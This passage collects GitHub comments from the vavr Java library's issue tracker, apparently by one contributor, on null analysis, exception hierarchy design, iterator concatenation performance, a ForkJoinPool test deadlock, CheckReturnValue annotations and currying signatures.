might be the better idea considering the above.\nWith all these, I think my point that there is actually a price to pay if we take this route, is still valid.\n. I'm using the null analysis capability built into Eclipse. See Null Analysis on Eclipse Wiki and Using null annotations (pay attention to all 3 subchapters about null annotations, particularly about null type annotations and external null annotations).\nNull analysis in Eclipse seems to be the most powerful from the solutions out there, although I admit I haven't played much with other solutions. I tried with IDEA, but I couldn't make it work and I gave up after a short while as I'm using Eclipse anyway. I'm willing to give IDEA another shot when I'll have more time to see if it could be made it possible to share the same annotation metadata across Eclipse and IDEA.\nI also used the LastNPE eclipse plugin which helps in automatic configuration of external annotations for maven projects, which somehow was left out of the original eclipse solution. Without this plugin, the external annotation configuration would be completely manual in Eclipse and it would be a huge pain in the ass.\nTo me, null analysis was a great success, although it's not without it's own glitches. But I expect those will be solved in later releases. I have way less NPE problems now than before, and I think it improved my coding in the sense that now I do the most I can to avoid even the possibility of null references in my code in the first place. Also, I feel that going all in with it is the best approach, since if you don't change your coding style and you mix null with non-null a lot in your code, it will be pretty annoying, with nullability annotations all over your code. But I consider that as a positive as it will push you towards cleaning up your code and move away from nulls. For me the best approach was to declare non-null at a package level and only do very rare @Nullable exceptions, or none at all if possible (performance critical code might warrant using one less indirection and use null instead).\nI didn't try out the Checker Framework, so I can't say anything about it. They say they support Eclipse's annotations, so I might give it a try on some existing project to see what it does.. Cast would be problematic because it could make the code fail at runtime. The Eclipse compiler doesn't need those kind of casts most of the time (I can't recall a case where it needs them on otherwise valid code that works without casts in javac). Those Eclipse compiler vs javac compiler differences can be solved most of the time with type hints, which are things that help the inference engine but they are not casts. I think it's a good thing to aim for the whole code-base to be cast free, and limit casts to cases where it's both absolutely necessary and safe at the same time.. This can be worked around quite easily even if it stays like it is now, but I think interpreting it as a recoverable error rather than non-recoverable makes more sense. Maybe the Scala people got it wrong in the first place?\nThis changeset is suggesting this might actually be the case:\nhttps://github.com/scala/scala/commit/68f62d7e9c200034bd42ffaf795b57fb379d9d38\nAlso, this bug: https://issues.scala-lang.org/browse/SI-7164\nI'm not familiar with Scala but it seems they have a separate mechanism to distinguish between fatal and non-fatal exceptions while Java, and more precisely, generic error handling code in Java uses the base Java exception categories: Exception, RuntimeException, Error.\nI think the mistake was that they thought at first that it's similar to Java's LinkageError while in reality it's not, because LinkageError is thrown in an unexpected/invalid state where some binary incompatibility arose, while the NotImplementedError is pretty much intentional.\nAnd it seems they pretty much treat it as a recoverable error, contradicting the intended use of Error as a base class.\nThe question is whether we want to blindly copy Scala behavior even if it seems wrong or walk our own walk where appropriate?. What if we would only change the superclass, but not the name? We could keep binary compatibility while subtly changing semantics towards the right way.. NotImplementedError extending Error instead of RuntimeException doesn't prevent it from ending up in production. It depends on whether the pre-production testing of the app actually touches that code path or not. The only difference I see is how the application reacts to such an event.\nLet's suppose there's an app shell providing the skeleton for the app (could be a container or some custom app skeleton). The skeleton/container is responsible for centralized error handling. The app skeleton/container contains a number of modules, and it's not even aware that one of the module uses vavr. The error handling code is some top level code that contains an exception handler that handles Exception subclasses to log them and to present the user with some meaningful error message (\"This function is not implemented yet\" is a meaningful user error message). The generic error handler also catches subclasses of Error, but only to log them, rethrowing afterwards, letting the app die, as there's no expected way to recover from such an error. This kind of generic error handling code is pretty common, I suppose a lot of frameworks/containers contain such error handling code.\nIn the end, we didn't necessarily prevent the app going into production (that's more a matter of proper testing), but made matters worse by letting our app die while we could just as easily recover from the exception.\nI strongly believe TODO is a recoverable exception and we should treat is as such.\nAlso note that Try.of(API::TODO) returns a Failure(javaslang.NotImplementedError: An implementation is missing.), while \n``java\nTry.of(() -> {\n    throw new LinkageError();\n});\n````\nthrowsTry.FatalException, a subclass ofRuntimeExceptionwhich is pretty wrong, it converts a non-recoverable exception into a recoverable one. My point is that vavr already treatsNotImplementedErroras a recoverable exception, it just doesn't communicate it as such to the outside world (being a subclass of the non-recoverableError`). \nTo be clear, I mean, that API.TODO appearing in the code path inside a Try.of(...) control code will happily return a Failure without throwing anything, but API.TODO outside of Try will propagate to top level error handling code and will probably crash the application, unless it's caught explicitly.\nThis seems to be a useful discussion as it uncovered another possible issue, that of FatalException being a subclass of RuntimeException.. > Before having TODO(), the only possibility was to assign null to such code-parts. This could leak undefined behaviour into the code base. The job of TODO() resp. NotImplementedError is to put this right.\n\nWhen we start to treat NotImplementedError as recoverable exception, the original idea of replacing null is broken again. It will lead to a JavaScript-like undefined state. We have to make clear that a TODO() is an error that has to be fixed by the developer.\n\nI wasn't saying TODO() is a bad idea and we should use return null; instead, on the contrary, I think it's good practice, I just said that extending RuntimeException would be better than extending Error, because of semantics defined in the java.lang.Error class javadoc. I see this as a very similar exception to UnsupportedOperationException, the only difference being the latter is not necessarily planned to be implemented later.\n. See for example google guava introduced ExecutionError as a counterpart of JDK's ExecutionException to wrap Errors to keep the semantics of the exception type categories. Also UncheckedExecutionException for wrapping RuntimeException.. No, why would I want to make it fatal? I was arguing for great lengths to make TODO() use a softer exception, not a more severe one :). Here's my guess at what he means with 'Just'. \nThe vavr abstractions for data transformation are quite handy. I think he wants those abstractions starting out from a single value. RxJava is a different kind of data transformation abstraction (push-based, can be asynchronous), but the idea is similar. They have a just method to start out from a single value and chain transformations from there in a fluent API. \nIxJava is another example, which is something like Iterables on steroids. It's also a data transformation library (pull-based, synchronous, lazy), it's practically RxJava's synchronous dual, and functionally it's quite similar to vavr's data transformation abstractions. It also has a just method. The particularily nice feature of IxJava is that it has really no dependencies, you can feed in the most simple thing as an Iterable and end up with another Iterable (you can collect into Collections similarly to Java Streams) and the whole thing is lazy, i.e., you only pay for what you're pulling out from the Iterable. It's a pity that people don't know about this nice lib, since it's low popularity might seal it's fate in the long run.\nThese libraries are maintained by the same guy, BTW, D\u00e1vid Karnok, and they're awesome. He also has some nice performance measurement comparing different data processing libraries and he describes the results on his blog.\nI think @durron597 meant that he would like to start out from a single value just as you can start out from a single value with these libraries and build your way up from there through the fluent API.  Maybe a <T>\u00a0Value<T>\u00a0Value.just(T) method so you can start from there and map/flatMap/etc your way up from there. Probably backed by a Single type, which could stay package-private. Not sure what significant difference would that bring compared to Array.from(T), besides probably one less indirection (single element array vs direct reference) and isSingleValued().. @danieldietrich what's to gain from splitting up the current vavr core to multiple modules?. Seems like a mixed bag. Maybe modularization is a subject that warrants it's own thread? We kinda hijacked this issue.. If we compile this code, will it work with Java8? (i.e. backward compatible on bytecode level). Shouldn't then we keep our primary JDK version at 8, so that we can use it both in JRE8 and 9? I guess at least the bytecode compiled with JDK8 will be forward compatible with JDK9. Or am I wrong?. What I see is that when you're building an iterator by concatenating iterators which are themselves composed by concatenating iterators, possibly to some (not necessarily deep) levels, the overhead of delegating through the structure gets amplified very much. Even with those optimization that are easy (non-structural) that I mentioned about avoiding redundant hasNext invocations and caching hasNext boolean values if until next() is called, it's still slower than scala's solution. Though it's pretty significant improvement (from 100 000x slower to 10-20x slower). But I think the end goal would be to have something of similar performance as scala's, or even faster, if it's possible.\nI see two ways to do it: optimize the structure at iteration time (scala seemingly does this) or at construction time. I'm currently evaluating how scala's solution would look like in vavr, but I'm not sure at all how a pretty verbatim translation of scala's code into vavr would be from licensing point of view. Scala's license allows it? How do we feel about verbatim translations?\n. Yes, exactly. I made those easy optimizations quickly but didn't post them as I considered them still not enough. I got similar results as you.. Verbatim translation of scala's solution would yield this result (with this we can run on bigger iterators too):\nImpl                 | Params | Count  |          Score | \u00b1     Error |   Unit | scala_persistent | vavr_persistent\n---------------------|--------|--------|----------------|-------------|--------|------------------|----------------\nscala_persistent     |     10 |     5  |   2,137,254.04 | \u00b1\u00a015.13%    |  ops/s |                  |          1.64\u00d7\nscala_persistent     |     20 |     5  |   1,090,057.26 | \u00b1\u00a013.46%    |  ops/s |                  |          1.30\u00d7\nscala_persistent     |    100 |     5  |     236,602.75 | \u00b1\u00a0 9.34%    |  ops/s |                  |          0.79\u00d7\nscala_persistent     |   1000 |     5  |      29,743.35 | \u00b1\u00a012.83%    |  ops/s |                  |          1.04\u00d7\nvavr_persistent      |     10 |     5  |   1,301,092.75 | \u00b1\u00a015.54%    |  ops/s |           0.61\u00d7  |             \nvavr_persistent      |     20 |     5  |     837,146.89 | \u00b1\u00a010.26%    |  ops/s |           0.77\u00d7  |             \nvavr_persistent      |    100 |     5  |     300,793.44 | \u00b1\u00a0 6.44%    |  ops/s |           1.27\u00d7  |             \nvavr_persistent      |   1000 |     5  |      28,468.67 | \u00b1\u00a031.79%    |  ops/s |           0.96\u00d7  |\nPerformance now varies (not sure why :D), but it's pretty similar.\n. Please advise what to do :) I'm kinda short on time, but I can think on a solution to this if the porting of the scala code is not acceptable for some reason. Or if it's okay, I can add the scala port to the PR.. Oh, and BTW, is this necessary: AbstractIterator.java#L31-L33? This check in AbstractIterator also hurts performance in this particular case, or more generally, with complex Iterator structures. It's one extra invocation to hasNext() which is probably done anyway by most well-behaved iterations, and getNext() should probably be responsible for the check. \nWouldn't be much of a problem if we would cache the result of hasNext(), so we don't do the expensive real hasNext().. That's the class with an unicode \u03bb as it's name. It got renamed to Lambda. Switch to the renamed project io.vavr:vavr, it has it's first release as 0.9.0 in the central maven repository.. Note that while this doesn't affect the bug itself, while (true) {} is not interruptible, i.e., it will never release the thread back to the ExecutorService, even if you call cancel().. LGTM. I like it's iterative, besides being faster, stack will not be a limiting factor. \ud83d\udc4d. The only drawback I can see is that the ConcatIterator became mutable in a new way (was mutable while iterating over it, now it's also mutable while it's being built). This means that the following code is an infinite loop:\njava\n        Iterator<Integer> single = of(1);\n        Iterator<Integer> concat = single.concat(single);\n        concat = concat.concat(concat);\n        int count = concat.count(__ -> true);\nI'm not entirely sure if we should correct this kind of behavior (scala's solution behaves the same). We would need to create a copy of the linked list of Cells.\n. Thank you, guys!. @chb0github That's an interesting idea. Did you try to investigate whether it is actually possible?\nTo me it seems that Hibernate (and JPA providers in general) are pretty much tied to the Java Collection API. For example, they provide special implementations of the Java Collection API interfaces Set, List, Map, etc: PersistentSet, PersistentList, PersistentMap, and so on.\nI didn't look into this recently, but I remember from a few years ago that Hibernate didn't provide the customization capabilities required to use different implementations for these persistent collection classes. With all the features JPA providers support, like lazy association fetching, these classes are designed with mutability in mind. Without active customization support on this level from the persistence provider, implementing these kind of things could prove really difficult.\n. If the dependency is unidirectional between vavr-match and vavr-core, I think it's a good idea to split them into two. You could still include just vavr-match in your dependencies and get the core transitively. It could, in theory (haven't tested though), speed up the GWT compilation, I think the match module is not compatible with GWT anyway. . Just a thought. Maybe it's worth considering splitting the base interfaces of IndexedSeq and Seq and others to a read-only view interface that doesn't allow any \"change\" (change in case of immutable collections meaning, of course, returning new instances of the underlying collection type), and another interface for the \"change\" methods. With that, types like ArraySet could be viewed as an indexed sequence, but not manipulated as one, as that doesn't really make sense in the context of ArraySet.. I don't know. What would be the the defined behavior if you would prepend an element into an ArraySet, that already contains that element. Same for append or insert? Maybe removeAt could make sense, but with all the other IndexedSeq methods not being self-evident, I tend to think that it's better not to have them in the first place. ArraySeq would be a special collection type, with well-defined behavior for some operations, and not so well-defined for others. Maybe it would be simpler to have just those operations that are self-evident. Having more fine-grained separation of interfaces might help achieving that goal.. @chb0github How do you access the nth element (indexed access)?. @chb0github that's what ArraySet would provide. HashSet combined with Array, to provide (read-only) indexed access of insertion order in O(1).. I would recommend EqualityChecker as name for such an interface.. Another factory method worth considering could be one accepting a Supplier<Option<? extends T>>,\nwhich would repeatedly invoke the supplier while it's a Some and end on the first None.. @m-titov you might want to subscribe to issue https://github.com/vavr-io/vavr/issues/1919. It might be extended in the future with information of your interest.. @emmanueltouzery you should check my comment for another issue. I think Findbugs or ErrorProne would help us check that we don't ignore a return value from a method that creates a new persistent collection, we just need to make vavr support it.. That would most probably break GWT compatibility.. > PriorityQueue.of(1.0d, 1.0f).average();\nI can't even make that compile with Eclipse w/ Java8 source level. What does IntelliJ infer there? I can't seem to find a common T superclass for Double and Float that implements Comparable<T>. Is there any?. @smillies vavr compiles under Eclipse since https://github.com/vavr-io/vavr/pull/2224 and the IDE has a decent performance working with vavr since Eclipse JDT: Slow compilation in project with many wildcards generics\nI think this issue can be closed.. Well, actually, vavr-benchmark doesn't compile yet under Eclipse, but I'll provide a fix shortly.\n\n. PR for the fix: https://github.com/vavr-io/vavr/pull/2244. \nYou can develop vavr in eclipse now.. @danieldietrich what were the problems using ForkJoinPool?. I could maybe take a look into it if it's still an issue.. @danieldietrich I ran the tests with Future.DEFAULT_EXECUTOR_SERVICE = ForkJoinPool.commonPool() and all passed (except two tests that are ignored because of #1530). What should I look for? Maybe it got fixed?. > @nfekete I will perform that change now in order to be able to release 0.9.1 this evening. I hope you are ok with that.\nYes, absolutely.. Does the deadlock only occur on the CI server? Can you reproduce it locally?. I don't know. It would be good to see what are the differences between CI instance and local one. Maybe CI is virtualized so that it only sees 1 CPU, which might cause differences between the default JVM setup of common concurrency primitives? It would be much easier to debug if we could reproduce the issue locally. Can you find out the Travis instance VCPU count?. I pulled your changes from your branch and changed the following:\npatch\nIndex: pom.xml\nIDEA additional info:\nSubsystem: com.intellij.openapi.diff.impl.patch.CharsetEP\n<+>UTF-8\n===================================================================\n--- pom.xml (date 1505604858000)\n+++ pom.xml (revision )\n@@ -302,6 +302,7 @@\n                     <artifactId>maven-surefire-plugin</artifactId>\n                     <version>${maven.surefire.version}</version>\n                     <configuration>\n+                        <argLine>-Djava.util.concurrent.ForkJoinPool.common.parallelism=1</argLine>\n                         <parallel>none</parallel>\n                         <!--\n                         <parallel>all</parallel>\nWith this change I was able to reproduce the Travis deadlock. It should be easier to debug it locally with this.. I think I met a similar problem with parallel streams a while ago, that's why I volunteered to help with ForkJoinPool issues. I can't recall precisely what happened there, but there was a similar pattern: tasks in an FJP waiting on other tasks in the same pool.. It seems it can throw IllegalStateException, see https://github.com/vavr-io/vavr/blob/1e6af93c618198aa722714226a682eca13132d64/vavr/src/main/java/io/vavr/concurrent/FutureImpl.java#L250 and https://github.com/vavr-io/vavr/blob/1e6af93c618198aa722714226a682eca13132d64/vavr/src/main/java/io/vavr/concurrent/FutureImpl.java#L229, https://github.com/vavr-io/vavr/blob/1e6af93c618198aa722714226a682eca13132d64/vavr/src/main/java/io/vavr/concurrent/Promise.java#L335. Findbugs and ErrorProne both support CheckReturnValue. (See also http://errorprone.info/bugpattern/CheckReturnValue). Both can be used in IntelliJ and Maven, but ErrorProne relies heavily on com.sun.* so it doesn't work with ECJ. They recommend Findbugs for now. AFAIK Findbugs has both Eclipse and IDEA plugins and Maven support too. Findbugs supports self-supplied annotations as long as they follow the naming convention, so we can either choose to depend on JSR-305 annotations or supply our own version of the annotations we use. I tested whether self-supplied annotation works and it indeed worked, see below.\n```java\nimport java.lang.annotation.Documented;\nimport java.lang.annotation.ElementType;\nimport java.lang.annotation.Retention;\nimport java.lang.annotation.RetentionPolicy;\nimport java.lang.annotation.Target;\n@Documented\n@Target({ ElementType.METHOD, ElementType.CONSTRUCTOR, ElementType.TYPE, ElementType.PACKAGE })\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface CheckReturnValue {\n}\njava\npublic class Test {\n@CheckReturnValue\npublic Test changeTest(int a) {\n    return new Test();\n}\n\npublic static void main(String[] args) {\n    Test test = new Test();\n    test.changeTest(1);\n}\n\n}\n```\nIt provides the following error marker in the eclipse findbugs view at the line test.changeTest(1);:\n\n. CheckReturnValue can also be applied to class or package level, and use CanIgnoreReturnValue to exempt methods from its scope, but it's not supported by Findbugs, and it would be great to be able to use  Eclipse to check client code as well, so I would go with using only CheckReturnValue, even if that would mean somewhat spamming it around.. I'm using findbugs and jsr305 annotations in a GWT project and GWT compiler is totally fine with them as long as they're available for inspection on a source code level for the GWT compiler.. @danieldietrich i had it in mind for long to make vavr both nullness checking ready and findbugs ready (from client perspective), just haven't had the time yet. The findbugs part (the things we're currently discussing in this issue) shouldn't be too hard, but the nullness part is much more work.. I was planning to do this for vavr, together with the nullness checking. I just never had the time to do it (mostly because the nullness part would be a bit harder and would take more time than I had to spare lately).. I understand your argument, although I think it's slightly different from the behavior-affecting annotations that are so specific to Spring for example, and the coding style of programming-through-annotations it brings. These are really just compiler flags, their presence or lack thereof would not affect how vavr code functions, and they could be viewed as documentation (for humans, for compilers). Also, @CheckReturnValue can be specified on a type level, so it's not like you would need to spam it on each and every method in vavr.. I view them as documentation of the API, only a bit better in the sense that tools can warn me based on that documentation that I'm doing something wrong. Is using @Override or @Deprecated or even /** @deprecated */ any different in principle?\n  . I'm not sure what you mean. R f(@Nullable Option<T> o) would be a terrible idea, the whole point of Option is to wrap both a value's presence and the value itself, to avoid having to handle nulls (plus compositionality). The R f(@NotNull Option<T> o) just makes sure on the compiler level (if checking is switched on) that you don't accidentally provide a null value as a parameter there as it will fail at runtime. Checking for this at compile time is arguably better than failing at runtime. And normally you shouldn't even have to write @NotNull Option<T>, class or package level defaults are there so that you don't have to clutter your code with verbose declarations like that. Eclipse supports that, I'm not sure about package level for IntelliJ IDEA.\nNote that you are actually checking against null in pretty much every vavr method, where most of the public methods accepting parameters are starting with statements like Objects.requireNonNull(elements, \"elements is null\");. You also need to document it /** @throws NullPointerException if {@code elements} is null */. Declaring it to be @NonNull just makes the whole thing explicit for tooling. How does a single class/package level annotation compare to all the tedious documentation and extraneous code to check for nulls everywhere.\nI usually declare non-nullness on a package level and let the compiler enforce the code I write to be totally null-free. You can get quite far with disciplined coding not to have null values created by your own code, but coding is rarely isolated like that. We're using many libraries and a formal promise from a library vendor to never return null could turn out to be a great service to library users.\nAlso, the type argument scenario: Option<@NonNull T> is perfectly valid, at least in Eclipse, and you can also declare package level defaults for generics type arguments to be enforced to be non-null. So I don't even need to write Option<@NonNull T>, it's automatically enforced for the whole package.\nAnd the nice thing from the perspective of a library user is that you don't need to care about all this if you don't want to. Just don't enable null checking and you're free to spam nulls around wherever it's accepted.\nBut while nullness checking is arguably more useful and has a bigger impact than enforcing not ignoring the return value of a functional method (we're talking about a functional library), it's much more easier to work around the lack of nullness metadata, as the two main IDEs, IDEA and Eclipse both support providing these annotations externally. It's a bit more cumbersome, but it's manageable. I even have external nullness annotations for the JDK classes, I created them by analyzing JDK code and figured out which method return values are safe from null point of view and which are not, so the compiler can warn me right away if I treat a return value from a JDK API as non-null without actually checking for null, while leaving me alone if a return value is considered safe. The code you get out of this is much cleaner, less cluttered.\nI can totally live without any of these features (@CheckReturnValue is much less important, and nullness can be provided externally), but I think they are indeed useful, and they might warrant their pretty low cost.\nSorry for the long post, here's a potato: \ud83e\udd54.\n. > Yes, I decided that in order to provide human-readable error messages. Even if we had annotations, no one forces a developer to use the tooling. Also, if lib X uses Vavr and X.map(f) calls some of Vavr's map(f), f could be still null.\nYes, and that's the correct thing to do, I'm not arguing against it, I'm just arguing that a single piece of metadata on a class level stating that hey, man, you can relax, we won't screw you by returning null values is a nice little piece of information that can be used by the tooling. \nI don't want to drag out this thread with forever arguing over this issue, as I said it's not really an issue for me because the return values case is not pressing me in any way and the nullness I can do it externally.\nBut I'm doing it externally, another guy is doing it externally, and who knows how many guys are doing it, because there is no single source of authority for that metadata, so we all end up marking hundreds of methods and each parameter, after analyzing most of them, to state that hey, this method is cool, doesn't return null and we shouldn't pass one either. With external annotations you need to do this for each and every method and each of it's parameters and type arguments, and that is a lot of work, while this could be solved for many of us by just a few class or package level annotations directly in vavr.\n. @rkraneis yes, I had the same hijacked feeling too, as the nullability part has its own issue. If you could move your question to https://github.com/vavr-io/vavr/issues/1919, I would move my answer as well, as I'm gonna talk mostly about the null part.\nI haven't tried the Checker Framework yet. I tried Findbugs, but I'm not satisfied with it. I tried using the very same annotation we're talking about in this issue -@CheckReturnValue -, and it missed presenting the warning/error to me. Not sure whether this was an IDE plugin issue or something affecting the core Findbugs. I'm not sure about the state of Findbugs anyway, it might be abandoned. There's Spotbugs which claims to continue where Findbugs has left ott and it seems to be an active project. I might give a try to the Checker Framework as well.. When you write str.get()::trim, the str.get() part of the expression is evaluated immediately to create a method reference to String::trim bound to the result of str.get(), but the invocation will throw outside of the Try.run(...) control flow, before the method reference object could be created.\nOn the other hand, the lambda expression works, because no exceptions will be thrown during creation of the lambda object, str.get() will only be invoked later, inside the Try.run(...) control flow.\nThe same thing will happen with Integer.toString(1/0)::trim, only with a different exception type.\nSee java.lang.NullPointerException is thrown using a method-reference but not a lambda expression if it's still unclear.\nI suggest you close the issue.. Does it add any significant benefit in terms of either API syntax or performance compared to map(...)?. @Sir4ur0n I can't comment on the origin on that phrase but this is how I see it: in this particular case the two argument version (predicate + function) is better expressed with just a simple function (mapper) because in the former case, most of the time the predicate and the function are not independent of each other, rather, they are tightly related.  They can also be elegantly compacted into one in the form predicate ? function(input) : input. The predicate + constant and predicate + supplier are just special mapper functions (0 argument supplier and constant function).. If I offended you, I am truly sorry, I didn't mean to. \ud83d\ude1f . @danieldietrich I'm trying to understand this issue a bit better, so here's my question.\nWhat is the intended purpose of the Checked* functional interfaces?\nTo me, from the moment I saw those classes, it was pretty self-evident that they are declared like this with the intended purpose that we can use lambdas that throw checked exceptions throughout the vavr API without cluttering our own lambdas with exception handling code. That's pretty nice and helpful, but the people in this thread are right in the sense that, in order to accomplish the above goal, you only need to declare to throw Exception and you pretty much allowed all those lambdas to remain uncluttered from catching exceptions.\nIt there any other reason for the existence of the Checked* interfaces besides the above that I missed? Because if there's none, I'll have to agree that declaring to throw Throwable instead of Exception is unnecessary and actually harmful in this case. The harm I see in declaring to throw Throwable is that, there are practically two direct subclasses of Throwable: Exception (a checked exception type) and Error (an unchecked one). Java doesn't force you to catch Errors, on the contrary, it advises you in the docs not to. But if a method declares to throw Throwable you have no other choice but to catch Throwable, even if you intend to do anything meaningful with the Exception subclass branch only. Declaring to throw Throwable forces you to do an instanceof check on the throwable and rethrow it in case it's an Error subclass and you don't want to deal with it, which is probably the overwhelming majority of the cases. Declaring to throw Throwable makes reusing the Checked* interfaces in client code counterproductive. Of course, we can always create our own version of those functional interfaces with throwing just Exception, but then we cannot reuse those instances both in our own client code and through the vavr API.\nIn the rare cases when some API abuses the java exception class hierarchy by directly extending Throwable instead of Exception (both cases result in a throwable that needs to be catched), I think we could live with those very rare cases where we would need to explicitly write lambda expressions that are forced to handle that special Throwable subclass. Those cases would be very rare, and one could even argue that it's actually beneficial that it shows the user of such an API of the bad design choice, and maybe provide an incentive to refactor the offending API or use an alternative one if that's possible at all.\nEDIT: from looking at the code, I see that the Try intends to wrap all Throwables in a Failure, except 4 explicit exception types that are considered fatal and were decided to let them propagate by using the sneaky throws trick. I'd like to point out, that changing the signature of the throwing methods in the Checked* interfaces would still allow the same functionality, practically Try would be unaffected, because you can always catch a broader exception type from what is declared, so it wouldn't affect the current behavior of Try. The question here is more like: what are we forced to catch when interfacing with the Checked* interfaces.\nI think the whole purpose of this thread is to make the Checked* interfaces more reusable in other contexts besides interfacing with vavr code, and declaring to throw Exception instead of Throwable would do that without sacrificing any of the design goals of either Try or the Checked* interfaces themselves. It's all about what are we forcing on client code using instances of these interfaces while not limiting internal vavr code to do anyting less that what it currently does.\nPS: sorry for writing a novel ^^ \ud83d\ude33 . It feels good to make useful contribution to an awesome library like vavr is, so the pleasure is mine :). Yes, all sources need to be compilable by the JDT compiler in order to be usable in GWT. vavr-gwt provides only some emulation of some of the concurrency-related classes which are not available in the JavaScript environment as it has no concept of threads or concurrency.. This seems more like a type inference limitation of the compiler than an issue in vavr's method signatures. Adding a type witness to .map() resolves the issue:\njava\n        io.vavr.collection.TreeMap<String, MyClass<?>> vavrLookup2 = list.stream()\n            .<Tuple2<String, MyClass<?>>> map(x -> Tuple.of(x.id, x))\n            .collect(TreeMap.collector());\n. If this gets added, you might consider overloading peek instead of introducing bipeek. I don't see a reason to name it differently.. LinkedHashSet.add() and it's backing LinkedHashMap.put() can be linear in the worst case, when you're adding the same element over and over again, since, when the element is already contained in the set/map it's doing a replace on the existing element with the new instance in both the set/map and the queue used for keeping insertion order of the elements, and the cost of the latter is linear (see Queue.replace).\nYou can easily avoid this by checking if the set/map already contains the element to be inserted, and skip insertion if you don't actually need to replace the existing instance in the set/map. While this would effectively double the set/map lookup cost part of the insertion cost for new elements, it will be mostly a cache hit for the lookup so the cost would be negligible.\n. JDK's HashMap.put() is replacing as well, though HashSet.add() doesn't, as it's using a different representation for the set over the map (JDK's map is using (E, constant) entries whereas vavr uses (E, E) hence the difference in HashSet behavior).\nAs for the runtime properties of these operations, those are what I figured out just by looking at the code, without actually measuring anything, so I might be wrong.. This might be a property worth mentioning in the documentation. Would you like to submit a pull request?. I'm not sure about javadoc rules for vavr, but this behavior of LinkedHashSet.add(LinkedHashMap.put) on replacing the existing instance when inserting an element that's already a member of the set (associating a new value with a key that already exists) affects both the behavior of the set(map) and it's algorithmic complexity, and it's probably worth documenting. Also, the fact than union() and addAll() are using add(), in case of LinkedHashSet may affect their algorithmic complexity, so it's probably worth at least a sentence for interested users to check the algo complexity of add(). What do you think @danieldietrich ?. \ud83d\udc4d looks nice \ud83d\ude03 . See also https://stackoverflow.com/q/48655313/2699901. fix for #2209 . @jlorenzen do you mean widening and narrowing Tuples from the right?. \ud83e\udd26\u200d\u2642\ufe0f accidentally committed to my master branch. It's ok, no worries. \nI don't believe a comment on this would have a good signal to noise ratio. Devs could just assume type witnesses are intentional and not remove them.. I also stumbled upon the currying issue a while ago and I was surprised about the difference from the rest of the Function[2-8].curried() implementations. I believe the correct signature and implementation for Function1.curried() should be:\njava\n@Override\ndefault Function1<T1, Function0<R>> curried() {\n    return t1 -> () -> apply(t1);\n}. @alshain @danieldietrich Do you think deferred() would still be needed in case #2240 would be fixed?. I would also use the lambda, but since we already have curried(), by making it consistent with the other Function[2-8].curried() methods through #2240, it could also be done without using lambdas or introducing a new API element. I believe deferred() is thus unnecessary.. Also affects CheckedFunction1.curried(). Well, it turns out we still can't make them totally consistent with each other without also changing Function[2-8].curried() in similar fashion from\njava\ndefault Function1<T1, Function1<T2, R>> curried() {\n    return t1 -> t2 -> apply(t1, t2);\n}\nto\njava\ndefault Function1<T1, Function1<T2, Function0<R>>> curried() {\n    return t1 -> t2 -> () -> apply(t1, t2);\n}\nOtherwise we would still be making Function1.curried() special in that it would be the only curry() function returning a chain ultimately resulting in Function0, while the rest of the curry() methods would ultimately result in Function1.\nI feel the correct approach would be to make them absolutely consistent with each other.\nWhat do you think, @danieldietrich ?. Yes, I agree with keeping them for compatibility.. I'm not sure what is the expected behavior from your point of view in this case, but it might be worth pointing out, that vavr's Stream is not really analogous to Java's Stream as the former is traversable multiple times, while the latter can only be used once. Vavr's Stream is evaluated lazily but is cached afterwards, it's similar to a lazily constructed linked list. If you want a vavr type similar to JDK's Stream you're looking for Iterator.. You'd want it to lazily calculate only once (just like a vavr Iterator) but then transparently store the results in a linked list that can be reused. Note that vavr's Iterator cannot be reused, just like normal java iterators or java Streams.. Yes, vavr is close to Scala.. This is just first glance:\n1. you create a Stream instance with \n    Stream.iterate(1, i -> i + 1)\n2. you invoke drop(SIZE) on the previously created instance - while drop is running, the instance is still kept alive because that's the instance drop() was invoked on.\n3. when 2. finishes, the original stream can be thrown away, since a new Stream instance is returned to call tail() on.\nSo that means while drop() is running, the original Stream instance is still alive with all the lazily evaluated values cached in the linked list.\nI don't see how this could be \"solved\". It seems unsolvable at this moment in Java. Maybe if there was tail call elimination for tail recursive function calls, we could use a recursive implementation for drop(), and the GC would (maybe) notice those instances are not needed anymore. But without that, the original Stream instance is on the stack until drop() returns and cannot be reclaimed.. I don't know about SICP-style streams, but both Java iterators and streams are mutable. Java Streams are \"consumed\" once you invoke a terminal operation on them and cannot be reused. Vavr Iterators are still Java iterators, only on steroids \ud83d\ude04 . @Bill Could you elaborate a little bit on the problem you're trying to solve as all the above is a little bit too generic for me to see what you're trying to do that it's not supported by our current libraries? I'm not sure what the correct form would be for such a discussion as it's not strictly related to the present issue, so maybe the gitter channel would be a better fit, but then, that might be cluttered by other discussions too. But it's up to you.... Maybe I understand what you want. How about this code? Is this good for your purpose?\n```java\nstatic interface VavrIterable extends Iterable {\n    @Override\n    io.vavr.collection.Iterator iterator();\n}\nstatic VavrIterable naturalsWithIterable() {\n    return () -> Iterator.iterate(1, n -> n + 1);\n}\n@Test\npublic void nthTest2() {\n    assertThat(naturalsWithIterable().iterator().drop(N).head(), is(N + 1));\n    assertThat(naturalsWithIterable().iterator().drop(N).head(), is(N + 1));\n}\n```\nIf this does what you want, it might be worth giving a thought whether to include something like this into vavr. There's already an improved Iterator in vavr, but there's no improved Iterable, even if all that would do is to return an improved Iterator.\n. Fun fact: in your java project example dropTest() runs fine when run normally, but fails with OutOfMemoryError: GC overhead limit exceeded when run in debug mode.\nI'm not sure what causes the difference, probably there are some optimizations that are run in normal mode but are suppressed in debug mode.\nIt makes sense in the sense that with debug mode the JVM needs to keep unreferenced stack local variables alive, because a debugger might inspect them, but they are otherwise unneeded. The question, is whether there is a contractual obligation for the JVM to mark those otherwise unused stack local variables eligible for GC or not. I'm not that familiar with the JVM to be able to answer this question. If there's no contractual obligation from the JVM to mark unused stack local variables eligible for GC then any kind of solution based on this behavior would be risky territory, as it would depend on unspecified JVM optimization.\n. Are you looking for Option.getOrElseThrow(Supplier)? Note that while Option is very similar to JDKs Optional, you can still get null value out of it. This method will throw when the Option is empty, not when it holds a null value. It can hold a null value, in contrast with JDK's Optional.. Fair enough, but then, JDK doesn't contain that method either. But still, I fail to see why would you wrap a return value with Option if you don't allow the empty case by throwing exceptions. Wouldn't it be easier to just return the value itself or throw?\nAs a workaround, if you don't need to throw checked exceptions, you could use Option.onEmpty(Runnable)\noption.onEmpty(() -> throw new RuntimeException());\n. If you want to get rid of unnecessary wrapping why don't use use map instead of flatMap?\nWith f being a method with the signature Option<B> f(A value) you can use both\noption.map(value -> f(value).getOrElseThrow(() -> new 